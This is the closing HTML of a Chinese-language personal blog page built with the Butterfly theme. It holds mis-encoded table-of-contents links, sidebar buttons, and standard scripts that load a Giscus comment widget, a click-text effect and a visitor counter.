<span class="toc-text">6. ä¿®å¤å»ºè®®</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E7%9A%84%E5%8F%AF%E8%A7%81%E6%80%A7"><span class="toc-number">7.</span> <span class="toc-text">é»˜è®¤çš„å¯è§æ€§</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url(/img/aaaset/title.png);"><div class="footer-other"><div class="footer-copyright"></div><div class="footer_custom_text">-899</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="é˜…è¯»æ¨¡å¼"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="æ—¥é—´å’Œå¤œé—´æ¨¡å¼åˆ‡æ¢"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="å•æ å’ŒåŒæ åˆ‡æ¢"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="è®¾ç½®"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="ç›®å½•"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="å‰å¾€è¯„è®º"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="å›åˆ°é¡¶éƒ¨"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
  const isShuoshuo = GLOBAL_CONFIG_SITE.pageType === 'shuoshuo'
  const option = null

  const getGiscusTheme = theme => theme === 'dark' ? 'dark' : 'light'

  const createScriptElement = config => {
    const ele = document.createElement('script')
    Object.entries(config).forEach(([key, value]) => {
      ele.setAttribute(key, value)
    })
    return ele
  }

  const loadGiscus = (el = document, key) => {
    const mappingConfig = isShuoshuo
      ? { 'data-mapping': 'specific', 'data-term': key }
      : { 'data-mapping': (option && option['data-mapping']) || 'pathname' }

    const giscusConfig = {
      src: 'https://giscus.app/client.js',
      'data-repo': 'kizzy899/kizzy899.github.io',
      'data-repo-id': 'R_kgDONCC1iQ',
      'data-category-id': 'DIC_kwDONCC1ic4CtwTu',
      'data-theme': getGiscusTheme(document.documentElement.getAttribute('data-theme')),
      'data-reactions-enabled': '1',
      crossorigin: 'anonymous',
      async: true,
      ...option,
      ...mappingConfig
    }

    const scriptElement = createScriptElement(giscusConfig)

    el.querySelector('#giscus-wrap').appendChild(scriptElement)

    if (isShuoshuo) {
      window.shuoshuoComment.destroyGiscus = () => {
        if (el.children.length) {
          el.innerHTML = ''
          el.classList.add('no-comment')
        }
      }
    }
  }

  const changeGiscusTheme = theme => {
    const iframe = document.querySelector('#giscus-wrap iframe')
    if (iframe) {
      const message = {
        giscus: {
          setConfig: {
            theme: getGiscusTheme(theme)
          }
        }
      }
      iframe.contentWindow.postMessage(message, 'https://giscus.app')
    }
  }

  btf.addGlobalFn('themeChange', changeGiscusTheme, 'giscus')

  if (isShuoshuo) {
    'Giscus' === 'Giscus'
      ? window.shuoshuoComment = { loadComment: loadGiscus }
      : window.loadOtherComment = loadGiscus
    return
  }

  if ('Giscus' === 'Giscus' || !false) {
    if (false) btf.loadComment(document.getElementById('giscus-wrap'), loadGiscus)
    else loadGiscus()
  } else {
    window.loadOtherComment = loadGiscus
  }
})()</script></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="8,9,å°,é‡‘" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>